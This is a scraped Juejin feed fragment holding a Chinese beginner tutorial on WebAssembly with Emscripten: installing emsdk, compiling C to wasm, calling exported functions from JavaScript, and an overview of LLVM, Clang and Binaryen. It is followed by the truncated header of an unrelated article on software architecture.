content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="布列瑟农的星空"/> <meta itemprop="url" content="https://juejin.cn/user/976022056218471"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            WebAssembly入门（一）——Emscripten 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/976022056218471/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    布列瑟农的星空
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T11:30:45.000Z" title="Thu Jan 08 2026 11:30:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">WebAssembly介绍</h2>
<p>WebAssembly，简单来说，是一种浏览器可执行的代码格式，诸如 C、C++ 和 Rust 等源语言能够编译为WebAssembly代码，并暴露可供js调用的函数，使得js能够利用接近原生的速度完成一些逻辑。</p>
<p>关于WebAssembly的介绍，MDN已经足够详细了，<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWebAssembly%2FGuides%2FConcepts" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/WebAssembly/Guides/Concepts" ref="nofollow noopener noreferrer">developer.mozilla.org/zh-CN/docs/…</a>  ,不再赘述。</p>
<h2 data-id="heading-1">Emscripten 介绍和安装</h2>
<p>Emscripten 是一个基于 LLVM/Clang 的开源编译器工具链，核心是将 C/C++ 等原生代码编译为 WebAssembly（Wasm）和 JavaScript “胶水代码”，让高性能原生程序与库能在浏览器、Node.js 及其他 Wasm 运行时高效执行，性能接近原生，是原生代码向 Web 迁移的核心工具。更多信息可访问官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Femscripten.org%2Fdocs%2Findex.html" target="_blank" title="https://emscripten.org/docs/index.html" ref="nofollow noopener noreferrer">emscripten.org/docs/index.…</a></p>
<h3 data-id="heading-2">安装</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Get the emsdk repo</span>
git <span class="hljs-built_in">clone</span> https://github.com/emscripten-core/emsdk.git

<span class="hljs-comment"># Enter that directory</span>
<span class="hljs-built_in">cd</span> emsdk
<span class="hljs-comment"># Fetch the latest version of the emsdk (not needed the first time you clone)</span>
git pull

<span class="hljs-comment"># Download and install the latest SDK tools.</span>
./emsdk install latest

<span class="hljs-comment"># Make the "latest" SDK "active" for the current user. (writes .emscripten file)</span>
./emsdk activate latest

<span class="hljs-comment"># Activate PATH and other environment variables in the current terminal</span>
<span class="hljs-built_in">source</span> ./emsdk_env.sh
</code></pre>
<p>注：windows系统用<code>emsdk.bat</code>替换上述命令中的<code>emsdk</code>，用<code>emsdk_env.bat</code>替换上述命令中的<code>source ./emsdk_env.sh</code>。</p>
<h4 data-id="heading-3">安装验证</h4>
<p>在 Emscripten 的安装目录下打开终端，执行以下命令检查是否安装成功</p>
<pre><code class="hljs language-bash" lang="bash">./emcc --check
</code></pre>
<p>注：</p>
<ul>
<li><strong>windows系统</strong>，通过在文件中找到并打开<strong>emcmdprompt.bat</strong>来启动该提示符，在其他命令行中是找不到emcc的。</li>
<li><strong>在 Windows 系统中，使用emcc</strong>而不是 <strong>./emcc</strong>来调用该工具。</li>
</ul>
<p>安装成功后check的输出如下：
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d88e077f6d0429dbea009a7830a2562~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5biD5YiX55Gf5Yac55qE5pif56m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768476644&amp;x-signature=FRGyKCcGC%2Fw0sYLqrPt%2FwVk2K6c%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">入门实践</h2>
<h3 data-id="heading-5">hello world</h3>
<p>准备基础测试文件：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// test.c</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hello from Emscripten!\n"</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>执行编译</p>
<pre><code class="hljs language-bash" lang="bash">emcc test.c -o test.html <span class="hljs-comment"># 生成test.html + test.js + test.wasm</span>
</code></pre>
<p>启动本地服务器，打开test.html</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d77489e4e11f4aa496313dd1e0d1bd29~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5biD5YiX55Gf5Yac55qE5pif56m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768476644&amp;x-signature=baYlgl0jBz9WM26CbHL9jnrmyHo%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-6">生成文件介绍</h4>
<h5 data-id="heading-7">test.html</h5>
<p><code>test.html</code> 是 Emscripten 自动生成的<strong>完整 HTML 页面</strong>，本质是一个开箱即用的前端载体，核心作用是：</p>
<ul>
<li><strong>作为 Wasm/JS 代码的运行容器</strong>：内置了加载 <code>test.js</code>（胶水代码）的逻辑，无需你手动写 HTML 引入脚本；</li>
<li><strong>提供基础的交互界面</strong>：默认包含一个简单的页面结构，以及控制台输出区域（用于显示 C 代码中 <code>printf</code>/<code>puts</code> 等函数的输出）；</li>
<li><strong>简化测试流程</strong>：直接在本地服务器打开就可以运行，无需额外编写 HTML 代码。</li>
</ul>
<h5 data-id="heading-8">test.js</h5>
<p><code>test.js</code> 是整个编译产物的<strong>核心</strong>，也是 Emscripten 最关键的输出文件之一，被称为 “胶水代码”，作用是<strong>连接 JavaScript 环境和 Wasm 模块</strong>，填补两者的差异。</p>
<p>它包含以下核心功能（按执行顺序）：</p>
<p>（1）Wasm 模块的加载与实例化</p>
<p>自动处理 <code>test.wasm</code>（编译时同步生成的 Wasm 文件）的加载、解析和实例化，无需你手动调用 <code>WebAssembly.instantiate</code>。</p>
<p>（2）Emscripten 运行时初始化</p>
<p>初始化 Wasm 运行所需的环境：</p>
<ul>
<li>线性内存（Memory）管理；</li>
<li>虚拟文件系统（MEMFS/IDBFS）（模拟 C 的文件操作，如 <code>fopen</code>/<code>fwrite</code>）；</li>
<li>系统调用模拟（如 <code>exit</code>/<code>time</code>）；</li>
<li>错误处理和日志输出。</li>
</ul>
<p>（3）C/JS 互操作桥梁</p>
<ul>
<li>封装 C 函数的调用逻辑：把 Wasm 中的函数（如下划线前缀的 <code>_main</code>）映射为更友好的 JS 调用方式；</li>
<li>处理 C 标准库输出：把 C 代码中 <code>printf</code>/<code>puts</code> 的输出重定向到 HTML 页面的控制台区域；</li>
<li>暴露运行时 API：如 <code>ccall</code>/<code>cwrap</code>（用于 JS 调用 C 函数）、<code>FS</code>（文件系统操作）等。</li>
</ul>
<p>（4）自动执行 C 的 <code>main</code> 函数</p>
<p>默认情况下，<code>test.js</code> 初始化完成后会自动调用 C 代码中的 <code>main</code> 函数，这也是为什么你编译的 C 程序能直接在浏览器中运行。</p>
<p><strong>在实践中，我们不一定需要使用编译生成的胶水代码，很多时候自己手动管理wasm更方便。</strong></p>
<h5 data-id="heading-9">test.wasm</h5>
<p>执行 C 代码编译后的指令（如 main 函数、sum 函数）</p>
<h3 data-id="heading-10">js调用wasm函数</h3>
<p>这个demo中我们不生成胶水代码，使用原生api调用wasm。</p>
<p>准备c文件：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// calc.c</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span>
{
    <span class="hljs-keyword">return</span> a + b;
}
<span class="hljs-type">int</span> <span class="hljs-title function_">minus</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span>
{
    <span class="hljs-keyword">return</span> a - b;
}
</code></pre>
<p>执行编译</p>
<pre><code class="hljs language-bash" lang="bash">emcc calc.c -o calc.wasm  -s EXPORTED_FUNCTIONS=_sum,_minus --no-entry
</code></pre>
<p>编写html和js加载wasm</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>WASM Calc Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>WASM Calculator<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"output"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
      (<span class="hljs-keyword">async</span> () =&gt; {
        <span class="hljs-comment">// 加载 wasm 文件</span>
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">"calc.wasm"</span>);
        <span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">arrayBuffer</span>();
        <span class="hljs-keyword">const</span> wasmModule = <span class="hljs-keyword">await</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title function_">instantiate</span>(buffer);

        <span class="hljs-comment">// 导出的方法都在 instance.exports 里</span>
        <span class="hljs-keyword">const</span> { sum, minus } = wasmModule.<span class="hljs-property">instance</span>.<span class="hljs-property">exports</span>;
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(wasmModule);
        <span class="hljs-comment">// 调用并显示结果</span>
        <span class="hljs-keyword">const</span> a = <span class="hljs-number">7</span>,
          b = <span class="hljs-number">3</span>;
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"output"</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`
        sum(<span class="hljs-subst">${a}</span>, <span class="hljs-subst">${b}</span>) = <span class="hljs-subst">${sum(a, b)}</span>&lt;br&gt;
        minus(<span class="hljs-subst">${a}</span>, <span class="hljs-subst">${b}</span>) = <span class="hljs-subst">${minus(a, b)}</span>
      `</span>;
      })();
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>效果如下：
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7310ef4285ab46ec9ef663bfc23a7556~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5biD5YiX55Gf5Yac55qE5pif56m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768476644&amp;x-signature=7QbC3%2Be7OrW%2BVLf9Leew48hhPLQ%3D" alt="image.png" loading="lazy"/></p>
<p>注：</p>
<ul>
<li>在 C 语言的 ABI（应用二进制接口）规范里，<strong>大多数平台的链接器会为 C 全局符号加上一个下划线 <code>_</code> 前缀</strong>。<br/>
Emscripten 也遵循了这个传统。你写的 <code>int sum(int a, int b)</code>，编译后实际导出的符号是 <code>_sum</code></li>
<li>一般情况下编译时会找main函数，如果不需要main，可以加参数<code>--no-entry</code>,否则编译会报错</li>
<li>EXPORTED_FUNCTIONS参数不是必须，编译时可以根据文件内容生成导出的函数。但如果函数<strong>既没有被 C 代码调用，也没有被正确导出</strong>，Emscripten 可能会认为它没用，直接去掉它。因此可以修改代码，添加<code>EMSCRIPTEN_KEEPALIVE</code></li>
</ul>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// calc.c</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emscripten/emscripten.h&gt;</span></span>

EMSCRIPTEN_KEEPALIVE
<span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span>
{
    <span class="hljs-keyword">return</span> a + b;
}
EMSCRIPTEN_KEEPALIVE
<span class="hljs-type">int</span> <span class="hljs-title function_">minus</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span>
{
    <span class="hljs-keyword">return</span> a - b;
}

</code></pre>
<p>执行<code>emcc calc.c -o calc.wasm  -s  --no-entry</code>一样能得到两个函数</p>
<h4 data-id="heading-11"/>
<h2 data-id="heading-12">工作原理概览和LLVM/Clang介绍</h2>
<p>Emscripten 的编译流程如下：</p>
<ol>
<li><strong>前端编译</strong>：Clang 将 C/C++ 源码编译为 LLVM IR。</li>
<li><strong>中间优化</strong>：LLVM 与 Binaryen 对 IR 做代码精简、循环优化、死代码消除等。</li>
<li><strong>后端生成</strong>：输出 Wasm 二进制模块（.wasm）与 JavaScript 胶水代码（处理 Wasm 加载、内存管理、API 绑定），可选直接生成可运行的 HTML。</li>
</ol>

<pre><code class="hljs language-javascript" lang="javascript">C/C++ 源码
   ↓
<span class="hljs-title class_">Clang</span>（<span class="hljs-variable constant_">LLVM</span> 前端） → 生成 <span class="hljs-variable constant_">LLVM</span> <span class="hljs-variable constant_">IR</span>
   ↓
<span class="hljs-variable constant_">LLVM</span> 优化器 → 优化 <span class="hljs-variable constant_">LLVM</span> <span class="hljs-variable constant_">IR</span>
   ↓
<span class="hljs-variable constant_">LLVM</span> 后端 → 生成 原始 <span class="hljs-title class_">WebAssembly</span> 模块
   ↓
<span class="hljs-title class_">Binaryen</span>（wasm-opt） → 优化 <span class="hljs-title class_">Wasm</span> 
   ↓
最终输出：优化后的 .<span class="hljs-property">wasm</span> 
</code></pre>
<p>这里出现了一些名词：前端/后端/Clang/LLVM/IR，下面简单介绍下这些概念。</p>
<h3 data-id="heading-13">1. IR（Intermediate Representation，中间表示）</h3>
<p>IR 是编译器在<strong>前端（源码解析）</strong> 和<strong>后端（目标代码生成）</strong> 之间的 “中间语言”，是连接不同源码语言和不同目标平台的桥梁。核心特点如下：</p>
<ul>
<li>与源码语言无关：不管是 C/C++、Rust、Go 还是 Swift，只要能被 LLVM 前端编译，最终都会转换成统一的 IR。</li>
<li>与目标平台无关：IR 不包含任何 CPU 架构、操作系统的特有指令，只描述 “计算逻辑”。</li>
<li>分层设计：LLVM IR 分为 <strong>LLVM IR（文本 / 二进制形式）</strong> 和更底层的 <strong>Machine IR</strong>，前者用于跨平台优化，后者用于针对具体架构生成机器码。</li>
</ul>
<h3 data-id="heading-14">2. LLVM（Low Level Virtual Machine）</h3>
<p><strong>LLVM</strong>（Low Level Virtual Machine）是一个开源的编译器基础设施项目，<br/>
它本质上是一套<strong>编译器前端和后端的集合</strong>，支持多种编程语言和目标平台。</p>
<ul>
<li><strong>前端</strong>：如 Clang，把 C/C++ 转成 LLVM IR（中间表示）</li>
<li><strong>后端</strong>：把 LLVM IR 转成目标机器码（如 x86、ARM、WebAssembly）</li>
</ul>
<h4 data-id="heading-15">Clang</h4>
<p>Clang 是 <strong>LLVM 项目的一个核心子组件</strong>，本质是 LLVM 生态的<strong>C/C++/Objective-C 前端编译器</strong>，二者是<strong>框架与组件</strong>的关系 ——LLVM 提供通用的编译基础设施，Clang 负责将 C 系源码转换成 LLVM IR，再由 LLVM 的优化器和后端完成后续流程。</p>
<h3 data-id="heading-16">3. Binaryen</h3>
<p><strong>Binaryen</strong> 是一个专注于 WebAssembly（WASM）的<strong>工具链库和优化器</strong>，<br/>
由 WebAssembly 核心团队成员开发和维护（主要用 C++ 实现，带有 JS/Python 接口）。<br/>
它的目标是让 WebAssembly 代码<strong>更小、更快、更高效</strong>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[现代软件开发中常用架构的系统梳理与实践指南]]></title>    <link>https://juejin.cn/post/7592818202716979219</link>    <guid>https://juejin.cn/post/7592818202716979219</guid>    <pubDate>2026-01-08T10:04:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592818202716979219" data-draft-id="7592815497847685183" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="现代软件开发中常用架构的系统梳理与实践指南"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-08T10:04:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码事漫谈"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            现代软件开发中常用架构的系统梳理与实践指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码事漫谈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:04:55.000Z" title="Thu Jan 08 2026 10:04:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 